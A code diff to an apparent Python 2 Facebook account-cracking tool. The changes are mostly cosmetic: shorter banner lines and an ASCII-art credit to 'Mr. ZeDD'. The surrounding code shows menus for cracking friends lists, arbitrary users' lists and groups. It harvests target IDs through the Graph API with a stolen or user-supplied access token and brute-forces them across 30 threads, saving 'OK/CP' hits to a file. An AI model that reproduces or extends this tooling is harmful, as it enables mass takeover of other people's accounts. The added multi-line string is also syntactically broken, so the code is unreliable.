@@ -118,7 +118,7 @@ def login():
 	except (KeyError,IOError):
 		os.system('clear')
 		print logo
-		print 30*"\033[1;96m﹌"
+		print 25*"\033[1;96m﹌"
 		print('\033[1;96m[☆] \x1b[1;91mLogin With Facebook ID \x1b[1;96m[☆]' )
 		id = raw_input('\033[1;96m[+] \x1b[0;34mID/Email \x1b[1;91m: \x1b[1;92m')
 		pwd = raw_input('\033[1;96m[+] \x1b[0;34mPassword \x1b[1;91m: \x1b[1;92m')
@@ -193,10 +193,10 @@ def menu():
 		keluar()
 	os.system("clear")
 	print logo
-	print 30*"\033[1;96m﹌"
+	print 25*"\033[1;96m﹌"
 	print "\033[1;96m[\033[1;97m✓\033[1;96m]\033[1;93m Name \033[1;91m: \033[1;92m"+Name+"\033[1;97m               "
 	print "\033[1;96m[\033[1;97m✓\033[1;96m]\033[1;93m ID   \033[1;91m: \033[1;92m"+id+"\x1b[1;97m              "
-	print 30*"\033[1;96m﹌"
+	print 25*"\033[1;96m﹌"
 	print "\x1b[1;96m[\x1b[1;92m1\x1b[1;96m]\x1b[1;36m Start Hacking"
 	print "\x1b[1;96m[\x1b[1;92m2\x1b[1;96m]\x1b[1;36m See Groups              "
 	print "\x1b[1;96m[\x1b[1;92m4\x1b[1;96m]\x1b[1;36m Yahoo Clone               "
@@ -236,7 +236,7 @@ def super():
 		login()
 	os.system('clear')
 	print logo
-	print 30*"\033[1;96m﹌"
+	print 25*"\033[1;96m﹌"
 	print "\x1b[1;96m[\x1b[1;92m1\x1b[1;96m]\x1b[1;36m Crack FriendzList"
 	print "\x1b[1;96m[\x1b[1;92m2\x1b[1;96m]\x1b[1;36m Crack AnyOne Lists"
 	print "\x1b[1;96m[\x1b[1;92m3\x1b[1;96m]\x1b[1;36m Crack Any Groups"
@@ -252,7 +252,7 @@ def pilih_super():
 	elif peak =="1":
 		os.system('clear')
 		print logo
-		print 30*"\033[1;96m﹌"
+		print 25*"\033[1;96m﹌"
 		jalan('\033[1;96m[✺] \033[1;93mSearching ID \033[1;97m...')
 		r = requests.get("https://graph.facebook.com/me/friends?access_token="+toket)
 		z = json.loads(r.text)
@@ -261,7 +261,7 @@ def pilih_super():
 	elif peak =="2":
 		os.system('clear')
 		print logo
-		print 30*"\033[1;96m﹌"
+		print 25*"\033[1;96m﹌"
 		idt = raw_input("\033[1;96m[+] \033[1;37mEnter Friend ID Code \033[1;91m: \033[1;97m")
 		try:
 			jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
@@ -279,7 +279,7 @@ def pilih_super():
 	elif peak =="3":
 		os.system('clear')
 		print logo
-		print 30*"\033[1;96m﹌"
+		print 25*"\033[1;96m﹌"
 		idg=raw_input('\033[1;96m[+] \033[1;93mInput ID Group \033[1;91m:\033[1;97m ')
 		try:
 			r=requests.get('https://graph.facebook.com/group/?id='+idg+'&access_token='+toket)
@@ -297,7 +297,7 @@ def pilih_super():
 	elif peak =="4":
 		os.system('clear')
 		print logo
-		print 30*"\033[1;96m﹌"
+		print 25*"\033[1;96m﹌"
 		try:
 			idlist = raw_input('\x1b[1;96m[+] \x1b[1;93mInput Name file  \x1b[1;91m: \x1b[1;97m')
 			for line in open(idlist,'r').readlines():
@@ -319,7 +319,7 @@ def pilih_super():
 		print("\r\033[1;96m[\033[1;97m✸\033[1;96m] \033[0;32mCrack \033[1;97m"+o),;sys.stdout.flush();time.sleep(1)
 	print
 	print('\x1b[1;96m[!] \x1b[0;32mStop CTRL+z')
-	print 30*"\033[1;96m﹌"
+	print 25*"\033[1;96m﹌"
 	
 			
 	def main(arg):
@@ -506,8 +506,34 @@ def pilih_super():
 		
 	p = ThreadPool(30)
 	p.map(main, id)
-	print 30*"\033[1;96m﹌"
-	print '\033[1;96m[\033[1;97m✓\033[1;96m] \033[1;92mSelesai \033[1;97m....'
+	print 25*"\033[1;96m﹌"
+        print"\033[1;96m
+
+                  `.-://////:-.`
+              .:+o+:-..````..-:+o+:.
+           `:o+-`                `:+o:`
+         `/o:`                      `:o/`
+        -s/`  .-..`            `..--` `/s-
+       /o.   `:.`.-:----------:-.``:-   .o/
+      /o`    .:`    `              --    `o/
+     -s.     .:`                   --     .s-
+     o/     .:`                     --     +o
+    .s-     :.        \033[1;91mZeDD          `:`    -s`
+    .s.     :.                      `:`    .s.
+    .s-     --                      .:     -s.
+     o/     `-.                    `-.     /o
+     -s.     `--`                `.-`     .s-
+      /o` ----``..--..`    `...--.`      `o/
+       /o. `----`  `-.      `-.         .o/
+        -o:  -.......        ..       `:o-
+         `:o:``....--        ..     `:o:`
+           `:+/-`  `-        ..  `-/+:`
+              `-/+///..````..://+/-`
+                  `.-::////::-.` \033[91;1m
+
+                \033[90;1mLife Of Programmer\033[91;1m
+             Powered by:\033[97m Mr. ZeDD"
+	print '\033[1;96m[\033[1;97m✓\033[1;96m] \033[1;92mDone \033[1;97m....'
 	print"\033[1;96m[+] \033[1;92mTotal OK/\x1b[1;93mCP \033[1;91m: \033[1;92m"+str(len(oks))+"\033[1;97m/\033[1;93m"+str(len(cekpoint))
 	print("\033[1;96m[+] \033[1;92mCP File Has Been Saved \033[1;91m: \033[1;97mout/ZeDD.txt")
 	raw_input("\n\033[1;96m[\033[1;97mBack\033[1;96m]")
